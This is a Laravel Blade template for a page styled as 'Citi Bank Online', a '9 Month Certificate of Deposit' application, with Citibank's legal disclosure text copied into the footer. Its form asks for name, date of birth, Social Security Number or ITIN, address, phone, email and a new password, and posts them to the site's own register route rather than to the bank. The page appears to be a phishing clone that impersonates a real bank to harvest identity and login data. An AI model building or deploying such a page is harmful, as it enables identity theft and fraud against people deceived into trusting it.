{{-- <x-guest-layout>
    <form method="POST" action="{{ route('register') }}">
        @csrf

        <!-- Name -->
        <div>
            <x-input-label for="name" :value="__('Name')" />
            <x-text-input id="name" class="block mt-1 w-full" type="text" name="name" :value="old('name')" required autofocus autocomplete="name" />
            <x-input-error :messages="$errors->get('name')" class="mt-2" />
        </div>

        <!-- Email Address -->
        <div class="mt-4">
            <x-input-label for="email" :value="__('Email')" />
            <x-text-input id="email" class="block mt-1 w-full" type="email" name="email" :value="old('email')" required autocomplete="username" />
            <x-input-error :messages="$errors->get('email')" class="mt-2" />
        </div>

        <!-- Password -->
        <div class="mt-4">
            <x-input-label for="password" :value="__('Password')" />

            <x-text-input id="password" class="block mt-1 w-full"
                            type="password"
                            name="password"
                            required autocomplete="new-password" />

            <x-input-error :messages="$errors->get('password')" class="mt-2" />
        </div>

        <!-- Confirm Password -->
        <div class="mt-4">
            <x-input-label for="password_confirmation" :value="__('Confirm Password')" />

            <x-text-input id="password_confirmation" class="block mt-1 w-full"
                            type="password"
                            name="password_confirmation" required autocomplete="new-password" />

            <x-input-error :messages="$errors->get('password_confirmation')" class="mt-2" />
        </div>

        <div class="flex items-center justify-end mt-4">
            <a class="underline text-sm text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-100 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500 dark:focus:ring-offset-gray-800" href="{{ route('login') }}">
                {{ __('Already registered?') }}
            </a>

            <x-primary-button class="ml-4">
                {{ __('Register') }}
            </x-primary-button>
        </div>
    </form>
</x-guest-layout> --}}

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Citi Bank Online</title>
  <link rel="Shortcut Icon" href="images/favicon.ico" type="image/ico" />
  <link rel="stylesheet" href="styles.css" />
  <script src="script.js" defer></script>
  <!-- <link rel="stylesheet" href="details.css" /> -->


<body class="antialiased">
  <!-- First Section -->
  <section class="p-2">
    <header class="max-w-full flex justify-between items-center">
      <img src="images/logo.png" alt="citi bank logo" class="img" />
      <div class="grid place-items-center">
        <img src="images/atm.png" alt="atm locator" class="atm w-10 h-10" />
        <p class="atm-b">ATM / Branch</p>
      </div>
    </header>
    <div class="top flex md:block items-center">
      <nav class="flex items-center md:block md:items-start w-full">
        <div class="md:hidden w-full flex justify-between items-center mx-2">
          <button id="menu-button">
            <ion-icon name="menu" class="text-3xl"></ion-icon>
          </button>
          <button id="close-button" class="hidden">
            <ion-icon name="close" class="text-3xl"></ion-icon>
          </button>
          <!-- <div class="flex items-center space-x-2">
            <ion-icon name="person-add" class="text-xl"></ion-icon>
            <a href="#" id="sign-on-btn">Sign On</a>
          </div> -->
        </div>

        <!-- Desktop Nav -->
        <ul class="hidden md:flex">
          <li>Credit Cards</li>
          <li>Banking</li>
          <li>Lending</li>
          <li>Investing</li>
          <li>Wealth Management</li>
          <li><a href="registration.html" style="text-decoration: none; color: white;">Open an Account</a></li>
          <li>How can we help?</li>
        </ul>
      </nav>
    </div>

    <!-- mobile Nav -->
    <div class="bg-white w-full h-56 p-4 z-10 mobile-menu md:hidden hidden">
      <ul class="space-y-3">
        <li>Credit Cards</li>
        <li>Banking</li>
        <li>Lending</li>
        <li>Investing</li>
        <li>Wealth Management</li>
      </ul>
    </div>
  </section>

  <section class="max-w-full my-4 mx-4">
    <div class="hidden">
      <img src="images/p6.jpg" />
    </div>

    <div class="space-y-3">
      <h1 class="font-bold text-purple-800 text-xl">9 Month Certificate of Deposit</h1>
      <div>
        <p class="text-xs">Secure Application</p>
        <hr class="text-slate-700">
      </div>
    </div>

    <div class="mt-4 space-y-6">
      <div>
        <h1 class="text-4xl tracking-wider">We're glad you're here!</h1>
      </div>
      <div>
        <p class="font-semibold">Things to know before you apply</p>
        <ul class="mt-3 space-y-2">
          <li class="list-item">We'll have to set up a User ID and password for online access to your account. You
            should never
            share
            your online banking credentials with a third party.
          </li>
          <li class="list-item">You'll need to accept the terms and conditions before submitting your application.</li>
        </ul>
      </div>
    </div>
  </section>

  <section class="max-w-full my-4 mx-4">
    <h1 class="text-xl text-purple-700 font-bold">YOUR PERSONAL INFORMATION</h1>
    <hr class="mt-2">

    <form method="POST" action="{{ route('register') }}" class="flex flex-col mt-8 space-y-6">
        @csrf
      <div class="w-full space-y-6 md:space-y-0  md:space-x-6 md:flex">
        <div class="flex flex-col md:flex-1">
          <label for="firstname">First Name</label>
          <input type="text" name="name" placeholder="E.g John" :value="old('name')" required autofocus autocomplete="name"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('name')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Last Name</label>
          <input type="text" placeholder="E.g Doe" name="lastname" :value="old('lastname')" required autofocus autocomplete="lastname"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('lastname')" class="mt-2" />
        </div>
      </div>
      <div class="w-full space-y-6 md:space-y-0  md:space-x-6 md:flex">
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Date of Birth (MM/DD/YYY)</label>
          <input type="date" placeholder="E.g 15/10/1965" name="date_birth" :value="old('date_birth')" required autofocus autocomplete="date_birth"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('date_birth')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Social Security Number or ITIN</label>
          <input type="text" placeholder="Social Security Number or ITIN" name="itin" :value="old('itin')" required autofocus autocomplete="itin"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('itin')" class="mt-2" />
        </div>
      </div>

      <div class="w-full space-y-6 md:space-y-0  md:space-x-6 md:flex">
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Address</label>
          <input type="text" placeholder="Apt./Ste./Other (Optional)" name="address" :value="old('address')" required autofocus autocomplete="address"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('address')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">City</label>
          <input type="text" placeholder="Your City Here" name="city" :value="old('city')" required autofocus autocomplete="city"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('city')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">State</label>
          <input type="text" placeholder="Your State Here" name="state" :value="old('state')" required autofocus autocomplete="state"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('state')" class="mt-2" />
        </div>
      </div>

      <div class="w-full space-y-6 md:space-y-0  md:space-x-6 md:flex">
        <div class="flex flex-col md:flex-1">
          <label for="firstname">ZIP Code</label>
          <input type="text"  placeholder="Your ZIP Code Here" name="zip_code" :value="old('zip_code')" required autofocus autocomplete="zip_code"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('zip_code')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Phone Number</label>
          <input type="text" placeholder="Phone Number" name="phone" :value="old('phone')" required autofocus autocomplete="phone"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('phone')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Email Address</label>
          <input type="email" placeholder="Your Email Here" type="email" name="email" :value="old('email')" required autocomplete="username"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('email')" class="mt-2" />
        </div>
      </div>
      <div class="w-full space-y-6 md:space-y-0  md:space-x-6 md:flex">
        <div class="flex flex-col md:flex-1">
          <label for="firstname">Password</label>
          <input type="password" max="6" placeholder="Create Your Password" name="password" required autocomplete="new-password"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('password')" class="mt-2" />
        </div>
        <div class="flex flex-col md:flex-1">
            <label for="firstname">Confirm Password</label>
          <input type="password" placeholder="Confirm Your Password" name="password_confirmation" required autocomplete="new-password"
            class="border px-4 py-2 w-full rounded-md bg-slate-100 focus:outline-none focus:ring-1 focus:ring-purple-700 hover:border-purple-500">
            <x-input-error :messages="$errors->get('password_confirmation')" class="mt-2" />
         </div>
      </div>
      <div>
        <button type="submit" class="w-full md:w-32 bg-purple-700 hover:bg-purple-500 text-white rounded-md py-3">Submit</button>
      </div>
    </form>
  </section>


  <!-- Footer Section -->
  <footer class="w-full bg-zinc-900 h-1/2 px-8 md:p-12 pt-12 pb-12">
    <div class="space-y-8">
      <p class="text-white md:text-justify text-xs">
        Important Legal Disclosures & Information

        Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A.
        and its affiliates in the United States and its territories. It does not, and should not be construed as, an
        offer, invitation or solicitation of services to individuals outside of the United States.

        Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all
        accounts, products, and services as well as pricing described here are available in all jurisdictions or to all
        customers. Your eligibility for a particular product and service is subject to a final determination by
        Citibank. Your country of citizenship, domicile, or residence, if other than the United States, may have laws,
        rules, and regulations that govern or affect your application for and use of our accounts, products and
        services, including laws and regulations regarding taxes, exchange and/or capital controls that you are
        responsible for following.

        The products, account packages, promotional offers and services described in this website may not apply to
        customers of International Personal Bank U.S. in the Citigold® Private Client International, Citigold®
        International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account
        Packages.

        Deposit products and services are offered by Citibank, N.A., Member FDIC
      </p>
      <div class="text-center space-x-4">
        <a href="#" class="text-white text-3xl hover:text-purple-700"><ion-icon name="logo-facebook"></ion-icon></a>
        <a href="#" class="text-white text-3xl hover:text-purple-700"><ion-icon name="logo-twitter"></ion-icon></a>
        <a href="#" class="text-white text-3xl hover:text-purple-700"><ion-icon name="logo-instagram"></ion-icon></a>
        <a href="#" class="text-white text-3xl hover:text-purple-700"><ion-icon name="logo-whatsapp"></ion-icon></a>
      </div>
    </div>
  </footer>

  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
</body>

</html>
